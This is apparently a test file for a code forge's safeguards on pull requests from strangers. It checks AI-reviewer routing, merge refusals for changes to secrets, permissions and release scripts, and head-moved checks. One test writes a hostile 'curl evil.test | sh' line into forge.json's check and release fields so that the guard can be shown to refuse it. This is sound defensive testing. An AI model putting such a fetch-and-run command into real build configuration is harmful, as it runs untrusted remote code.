/**
 * A stranger's pull (#9575, `crew/stranger.ts`): on an autonomous repository
 * the crew's reviewer reads it before any person, its code unrun; anywhere
 * else it waits for a person; it never lands on its own; and whatever any
 * review says, it never lands while it changes secrets, credentials,
 * permissions, release scripts or `forge.json`'s check and release lines —
 * read from git's diff on the server, the paths named. Its page tells the
 * author what happens next in one sentence.
 */

import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { addToCrew, createAgent } from "../src/actions/crew.ts";
import { landSlice } from "../src/actions/pull_slices.ts";
import { mergePull, openPull, refreshPullHead, submitReview } from "../src/actions/pulls.ts";
import { commitToBranch, createRepo, forkRepo } from "../src/actions/repos.ts";
import { createApp, type App } from "../src/app.ts";
import { getAgent } from "../src/core/agents.ts";
import { listEvents } from "../src/core/events.ts";
import { getIssueById } from "../src/core/issues.ts";
import { getPull, mergePull as landPull, type Pull } from "../src/core/pulls.ts";
import { getRepoById, type Repo } from "../src/core/repos.ts";
import { repoDir } from "../src/git/repos.ts";
import { createSession } from "../src/core/sessions.ts";
import { createToken } from "../src/core/tokens.ts";
import { createUser, getUserByName, type User } from "../src/core/users.ts";
import { markVerified } from "../src/core/verify.ts";
import { landIfGreen } from "../src/crew/autonomy.ts";
import { STRANGER_REVIEW, taskPrompt, type TaskInput } from "../src/crew/brief.ts";
import { route } from "../src/crew/dispatch.ts";
import { sendToReview, STRANGER_TRIES, sweepReviews } from "../src/crew/review.ts";
import { forgeJsonGuard, guardedPaths, isStrangerPull, strangerNext } from "../src/crew/stranger.ts";
import { forgeHttp, type ForgeHttp } from "../src/http/server.ts";
import { approveGuest } from "../src/origins/guest.ts";
import { createForgeApp } from "../src/tui/forge.ts";
import { GUEST_NOTE, GUEST_NOTE_FILTERED, pullScreen } from "../src/tui/screens/pull.ts";
import { local } from "../src/tui/screens/where.ts";
import { headlessTerminal } from "../src/tui/term/terminal.ts";
import { GUEST_WAITS } from "../src/web/pages/pull-guest.ts";
import { settleApp } from "./helpers/tui.ts";
import { setLimit } from "../src/settings/limits.ts";
import { quietLogs } from "./helpers/globals.ts";
import { seatAs } from "./helpers/seat.ts";

quietLogs();

const LONG_AGO = "2026-01-01T00:00:00.000Z";
const FORGE_JSON = `${JSON.stringify({ app: { run: "bun run a.ts" }, check: { run: "bun test" } }, null, 2)}\n`;

describe("a stranger's pull", () => {
  let dataDir = "";
  let app: App;
  let http: ForgeHttp;
  let owner: User;
  let lib: Repo;
  let auto: Repo;
  let n = 0;
  const url = "http://forge.test";

  async function stranger(): Promise<User> {
    const username = `stranger${++n}`;
    const made = await createUser(app.db, { origin: "seed", trusted: true, username, email: `${username}@test.dev`, password: "correct-horse-battery" });
    if (!made.ok) throw new Error(made.error);
    markVerified(app.db, made.value.id, new Date().toISOString());
    app.db.query("UPDATE user SET created_at = ?1 WHERE id = ?2").run(LONG_AGO, made.value.id);
    return getUserByName(app.db, username)!;
  }

  async function publicRepo(name: string): Promise<Repo> {
    const made = await createRepo(app, owner, { name, visibility: "public" });
    if (!made.ok) throw new Error(String(made.error));
    const seeded = await commitToBranch(app, owner, made.value, {
      message: "Start",
      files: [
        { path: "README.md", content: "hi\n" },
        { path: "forge.json", content: FORGE_JSON },
        { path: "scripts/cut-release.ts", content: "export {};\n" },
      ],
    });
    if (!seeded.ok) throw new Error(JSON.stringify(seeded.error));
    return getRepoById(app.db, made.value.id)!;
  }

  /** A new stranger's pull from their own fork of `parent`, one commit per entry. */
  async function strangerPull(parent: Repo, ...commits: { path: string; content: string | null }[][]): Promise<{ user: User; fork: Repo; pull: Pull; oids: string[] }> {
    const user = await stranger();
    const head = await forkRepo(app, user, parent);
    if (!head.ok) throw new Error(String(head.error));
    const oids: string[] = [];
    for (const [i, files] of commits.entries()) {
      const committed = await commitToBranch(app, user, head.value, {
        branch: "change",
        ...(i === 0 ? { base: "main" } : {}),
        message: `Change ${i}`,
        files,
      });
      if (!committed.ok) throw new Error(JSON.stringify(committed.error));
      oids.push(committed.value.commitOid);
    }
    const opened = await openPull(app, user, parent, { title: "A change", body: "", baseBranch: "main", headBranch: "change", headRepo: head.value });
    if (!opened.ok) throw new Error(String(opened.error));
    return { user, fork: head.value, pull: getPull(app.db, parent.id, opened.value.number)!, oids };
  }

  /** The stranger pushes again to their fork; the pull's head follows. */
  async function push(user: User, fork: Repo, parent: Repo, pull: Pull, path: string, content: string | null): Promise<Pull> {
    const committed = await commitToBranch(app, user, fork, { branch: "change", message: "Again", files: [{ path, content }] });
    if (!committed.ok) throw new Error(JSON.stringify(committed.error));
    await refreshPullHead(app, parent, pull);
    const moved = getPull(app.db, parent.id, pull.number)!;
    expect(moved.headOid).toBe(committed.value.commitOid);
    return moved;
  }

  /** The owner approves it, as a guest and as a review: the most any word can give. */
  async function approveAll(repo: Repo, pull: Pull): Promise<void> {
    expect(approveGuest(app.db, repo, pull, owner).ok).toBe(true);
    const verdict = await submitReview(app, owner, repo, pull, { state: "approved", body: "Looks good" });
    expect(verdict.ok).toBe(true);
  }

  const page = async (user: User, repo: Repo, pull: Pull) =>
    (
      await http.handle(
        new Request(`${url}/${repo.ownerName}/${repo.name}/pulls/${pull.number}`, {
          headers: { cookie: `forge_session=${createSession(app.db, user.id).token}` },
        }),
      )
    ).text();

  beforeAll(async () => {
    dataDir = await mkdtemp(join(tmpdir(), "forge-stranger-pull-"));
    app = createApp({ dataDir, port: 0, host: "forge.test" });
    http = forgeHttp(app);
    const made = await createUser(app.db, { origin: "seed", trusted: true, username: "olive", email: "o@test.dev", password: "correct-horse-battery", adminIfFirst: true });
    if (!made.ok) throw new Error(made.error);
    markVerified(app.db, made.value.id, new Date().toISOString());
    owner = getUserByName(app.db, "olive")!;
    for (const [key, value] of [
      ["signup.per_source", 1000],
      ["guest.forks_per_day", 1000],
      ["guest.forks_forge_per_day", 1000],
      ["guest.pulls_per_day", 1000],
    ] as const)
      setLimit(app.db, key, value, "setup");
    lib = await publicRepo("lib");
    auto = await publicRepo("auto");
    app.db.query("UPDATE repo SET autonomy = 'autonomous', autonomy_by = ?1 WHERE id = ?2").run(owner.id, auto.id);
    auto = getRepoById(app.db, auto.id)!;
    const agent = await createAgent(app, owner, { username: "sentinel" });
    if (!agent.ok) throw new Error(String(agent.error));
    for (const repo of [lib, auto]) {
      expect(addToCrew(app, owner, repo, "sentinel").ok).toBe(true);
      expect(seatAs(app.db, repo.id, getUserByName(app.db, "sentinel")!.id, "reviewer")).toBe(true);
    }
  }, 60_000);

  afterAll(async () => {
    http.close();
    app.close();
    await rm(dataDir, { recursive: true, force: true });
  });

  /** Every review run out ends, with no verdict: slots free for the next test. */
  const finishReviews = () => app.db.run("UPDATE run SET state = 'ok', finished_at = ?1 WHERE kind = 'agent' AND reason = 'review' AND state IN ('queued','running')", [new Date().toISOString()]);

  const reviewRuns = (pull: Pull) =>
    app.db
      .query<{ n: number }, [string]>("SELECT COUNT(*) AS n FROM run WHERE kind = 'agent' AND reason = 'review' AND issue_id = ?1")
      .get(pull.id)!.n;

  test("on an autonomous repository the crew's reviewer reads it first, before its code has run", async () => {
    const { user, pull } = await strangerPull(auto, [{ path: "src/feature.ts", content: "export const x = 1;\n" }]);
    expect(isStrangerPull(app.db, auto, pull)).toBe(true);
    expect(await sendToReview(app, auto, pull)).toBe("sent");
    expect(reviewRuns(pull)).toBe(1);
    // One review out at a time: asking again sends nothing more.
    expect(await sendToReview(app, auto, pull)).toBe("wait");
    expect(reviewRuns(pull)).toBe(1);
    // Whatever the crew says, it does not land on its own.
    expect(await landIfGreen(app, auto, pull)).toBe(false);
    const shown = await page(user, auto, pull);
    expect(shown).toContain("reviewer reads this pull first, then a person who can write here decides whether it lands.");
    // A waiting guest gets one notice, not two.
    expect(shown).toContain(GUEST_WAITS.slice(0, 40));
    expect(shown).not.toContain("<h2>What happens next</h2>");
    finishReviews();
  });

  test("it is sent as it opens: the pull.opened route", async () => {
    const { pull } = await strangerPull(auto, [{ path: "src/opened.ts", content: "export {};\n" }]);
    expect(reviewRuns(pull)).toBe(0);
    const opened = listEvents(app.db, { repoId: auto.id, kind: "pull.opened" }).find((e) => e.payload["number"] === pull.number);
    expect(opened).toBeDefined();
    route(app, opened!);
    for (let i = 0; i < 200 && reviewRuns(pull) === 0; i++) await Bun.sleep(10);
    expect(reviewRuns(pull)).toBe(1);
    finishReviews();
  });

  test("a later head is sent by the sweep, once a verdict answered the first", async () => {
    const { user, fork, pull } = await strangerPull(auto, [{ path: "src/later.ts", content: "export const a = 1;\n" }]);
    expect(await sendToReview(app, auto, pull)).toBe("sent");
    finishReviews();
    const sentinel = getUserByName(app.db, "sentinel")!;
    expect((await submitReview(app, sentinel, auto, pull, { state: "changes_requested", body: "Name it better" })).ok).toBe(true);
    expect(await sendToReview(app, auto, pull)).toBe("done");
    await push(user, fork, auto, pull, "src/later.ts", "export const better = 1;\n");
    await sweepReviews(app);
    expect(reviewRuns(pull)).toBe(2);
    finishReviews();
  });

  test(`${STRANGER_TRIES} review runs with no verdict and it waits for a person`, async () => {
    const { pull } = await strangerPull(auto, [{ path: "src/silent.ts", content: "export {};\n" }]);
    for (let i = 0; i < STRANGER_TRIES; i++) {
      expect(await sendToReview(app, auto, pull)).toBe("sent");
      finishReviews();
    }
    expect(await sendToReview(app, auto, pull)).toBe("lapsed");
    expect(reviewRuns(pull)).toBe(STRANGER_TRIES);
  });

  test("the terminal says what happens next, and the guest note matches the repository", async () => {
    const open = async (user: User, repo: Repo, pull: Pull, words: string) => {
      const { app: tui, session } = createForgeApp(
        app,
        { sshUsername: user.username, remoteAddress: "127.0.0.1", fingerprint: `SHA256:${user.username}`, user },
        { terminal: headlessTerminal(240, 44), exitHooks: false },
      );
      tui.start();
      tui.ctx.push(pullScreen(session, tui.ctx, local(session, repo), pull.number));
      const end = Date.now() + 20_000;
      try {
        while (!tui.screen.toText().includes(words)) {
          if (Date.now() > end) throw new Error(tui.screen.toText());
          await settleApp(tui);
          await Bun.sleep(20);
        }
        return tui.screen.toText();
      } finally {
        tui.stop();
      }
    };
    const filtered = await strangerPull(auto, [{ path: "src/tty.ts", content: "export {};\n" }]);
    const onAuto = await open(filtered.user, auto, filtered.pull, "next: ");
    expect(onAuto).toContain(`next: ${strangerNext(auto, []).slice(0, 60)}`);
    expect(onAuto).toContain(GUEST_NOTE_FILTERED.slice(0, 50));
    expect(onAuto).not.toContain(GUEST_NOTE);
    const waiting = await strangerPull(lib, [{ path: "src/tty.ts", content: "export {};\n" }]);
    const onLib = await open(waiting.user, lib, waiting.pull, "next: ");
    expect(onLib).toContain(`next: ${strangerNext(lib, [])}`);
    expect(onLib).toContain(GUEST_NOTE.slice(0, 50));
    const walled = await strangerPull(lib, [{ path: ".env", content: "K=v\n" }]);
    const guardedText = await open(walled.user, lib, walled.pull, "next: ");
    expect(guardedText).toContain("because it changes guarded paths: .env (secrets or credentials)");
  }, 60_000);

  test("the reviewer is told it is a stranger's, unrun, and untrusted", async () => {
    expect(STRANGER_REVIEW).toContain("do not run");
    const { pull } = await strangerPull(auto, [{ path: "src/brief.ts", content: "export {};\n" }]);
    const input = (stranger: boolean): TaskInput => ({
      agent: getAgent(app.db, getUserByName(app.db, "sentinel")!.id)!,
      repo: auto,
      issue: getIssueById(app.db, pull.id)!,
      pull,
      branch: pull.headBranch,
      forgeUrl: url,
      isApp: false,
      resuming: false,
      role: "reviewer",
      reason: "review",
      comments: [],
      reviews: [],
      reviewComments: [],
      since: LONG_AGO,
      stranger,
    });
    expect(taskPrompt(input(true))).toContain(STRANGER_REVIEW);
    expect(taskPrompt(input(false))).not.toContain(STRANGER_REVIEW);
  });

  test("anywhere else it waits for a person and never lands on its own", async () => {
    const { user, pull } = await strangerPull(lib, [{ path: "src/feature.ts", content: "export const x = 1;\n" }]);
    expect(await sendToReview(app, lib, pull)).toBe("held");
    expect(reviewRuns(pull)).toBe(0);
    expect(await landIfGreen(app, lib, pull)).toBe(false);
    expect(await page(user, lib, pull)).toContain(strangerNext(lib, []));
    // A person's word lands it: the guard is for guarded paths, not every stranger.
    await approveAll(lib, pull);
    const merged = await mergePull(app, owner, lib, getPull(app.db, lib.id, pull.number)!, "squash");
    expect(merged.ok).toBe(true);
  });

  const guarded: [string, string, string][] = [
    [".env", "API_KEY=x\n", "secrets or credentials"],
    ["config/credentials.json", "{}\n", "secrets or credentials"],
    ["src/auth/login.ts", "export {};\n", "secrets or credentials"],
    ["src/core/roles.ts", "export {};\n", "permissions or the contract's walls"],
    ["src/actions/access.ts", "export {};\n", "permissions or the contract's walls"],
    ["scripts/cut-release.ts", "export const evil = 1;\n", "release machinery"],
    ["Dockerfile", "FROM scratch\n", "release machinery"],
  ];
  for (const [path, content, why] of guarded)
    test(`a change to ${path} is refused from landing, whatever the review says, the path named`, async () => {
      const { user, pull } = await strangerPull(auto, [{ path, content }]);
      await approveAll(auto, pull);
      const merged = await mergePull(app, owner, auto, getPull(app.db, auto.id, pull.number)!, "squash");
      expect(merged.ok).toBe(false);
      if (merged.ok) return;
      expect(merged.error).toEqual({ kind: "guarded", paths: [{ path, why }] });
      expect(getPull(app.db, auto.id, pull.number)!.mergedAt).toBeNull();
      expect(await page(user, auto, pull)).toContain(`because it changes guarded paths: ${path}`);
    });

  for (const key of ["check", "release"] as const)
    test(`a change to forge.json's ${key} line is refused, through the API too`, async () => {
      const next = JSON.parse(FORGE_JSON) as Record<string, unknown>;
      next[key] = { run: "curl evil.test | sh" };
      const { pull } = await strangerPull(lib, [{ path: "forge.json", content: JSON.stringify(next) }]);
      await approveAll(lib, pull);
      const token = createToken(app.db, owner.id, "t", "rw").token;
      const res = await http.handle(
        new Request(`${url}/api/v1/repos/olive/lib/pulls/${pull.number}/merge`, {
          method: "POST",
          headers: { authorization: `Bearer ${token}`, "content-type": "application/json" },
          body: JSON.stringify({ strategy: "squash" }),
        }),
      );
      expect(res.status).toBe(409);
      const body = (await res.json()) as { error: string; message: string };
      expect(body.error).toBe("guarded");
      expect(body.message).toContain(`forge.json (its ${key} line)`);
    });

  test("forge.json's check and release under app are guarded too", () => {
    const withApp = (extra: Record<string, unknown>) => JSON.stringify({ ...JSON.parse(FORGE_JSON), app: { run: "bun run a.ts", ...extra } });
    expect(forgeJsonGuard(FORGE_JSON, withApp({ check: "sh evil" }))).toEqual(["check"]);
    expect(forgeJsonGuard(FORGE_JSON, withApp({ release: "sh evil" }))).toEqual(["release"]);
    expect(forgeJsonGuard(FORGE_JSON, withApp({ health: "/up" }))).toEqual([]);
  });

  for (const [path, why] of [["forge.json", "its check line"], ["scripts/cut-release.ts", "release machinery"]] as const)
    test(`deleting ${path} is refused, the path named`, async () => {
      const { pull } = await strangerPull(lib, [{ path, content: null }]);
      await approveAll(lib, pull);
      const merged = await mergePull(app, owner, lib, getPull(app.db, lib.id, pull.number)!, "squash");
      expect(!merged.ok && merged.error).toEqual({ kind: "guarded", paths: [{ path, why }] });
    });

  test("a head pushed after the guard read it does not land: the oid merged is the oid judged", async () => {
    const { user, fork, pull } = await strangerPull(lib, [{ path: "docs/clean.md", content: "c\n" }]);
    await approveAll(lib, pull);
    const judged = pull.headOid;
    const moved = await push(user, fork, lib, pull, ".env", "K=v\n");
    // The landing told to merge the head that was judged finds another there, and refuses.
    const landed = await landPull(app.db, repoDir(app.reposRoot, lib.ownerName, lib.name), moved, {
      strategy: "squash",
      message: "x",
      actorId: owner.id,
      author: { name: "olive", email: "o@test.dev" },
      headOid: judged,
    });
    expect(!landed.ok && landed.error).toBe("head_moved");
    expect(getPull(app.db, lib.id, pull.number)!.mergedAt).toBeNull();
    // And the action, asked now, judges the head that is there.
    const merged = await mergePull(app, owner, lib, moved, "squash");
    expect(!merged.ok && merged.error).toEqual({ kind: "guarded", paths: [{ path: ".env", why: "secrets or credentials" }] });
  });

  test("forge.json's other lines are no guard", async () => {
    expect(forgeJsonGuard(FORGE_JSON, FORGE_JSON.replace("a.ts", "b.ts"))).toEqual([]);
    expect(forgeJsonGuard(FORGE_JSON, "not json")).toBe("unread");
    expect(forgeJsonGuard(FORGE_JSON, undefined)).toEqual(["check"]);
    expect(guardedPaths(["forge.json"], "unread")).toEqual([{ path: "forge.json", why: "forge.json could not be read" }]);
    const { pull } = await strangerPull(lib, [{ path: "forge.json", content: FORGE_JSON.replace("a.ts", "b.ts") }]);
    await approveAll(lib, pull);
    expect((await mergePull(app, owner, lib, getPull(app.db, lib.id, pull.number)!, "squash")).ok).toBe(true);
  });

  test("a slice is read against the guard as the whole pull is", async () => {
    const { pull, oids } = await strangerPull(lib, [{ path: "docs/a.md", content: "a\n" }], [{ path: ".env", content: "K=v\n" }], [{ path: "docs/b.md", content: "b\n" }]);
    await approveAll(lib, pull);
    const live = () => getPull(app.db, lib.id, pull.number)!;
    const refused = await landSlice(app, owner, lib, live(), oids[1]!);
    expect(!refused.ok && refused.error).toEqual({ kind: "guarded", paths: [{ path: ".env", why: "secrets or credentials" }] });
    expect((await landSlice(app, owner, lib, live(), oids[0]!)).ok).toBe(true);
  });

  test("a writer's own pull is no stranger's: the guard does not hold it", async () => {
    const committed = await commitToBranch(app, owner, lib, { branch: "own", base: "main", message: "Own", files: [{ path: ".env", content: "K=v\n" }] });
    expect(committed.ok).toBe(true);
    const opened = await openPull(app, owner, lib, { title: "Own", body: "", baseBranch: "main", headBranch: "own" });
    if (!opened.ok) throw new Error(String(opened.error));
    const pull = getPull(app.db, lib.id, opened.value.number)!;
    expect(isStrangerPull(app.db, lib, pull)).toBe(false);
    expect((await mergePull(app, owner, lib, pull, "squash")).ok).toBe(true);
  });
});
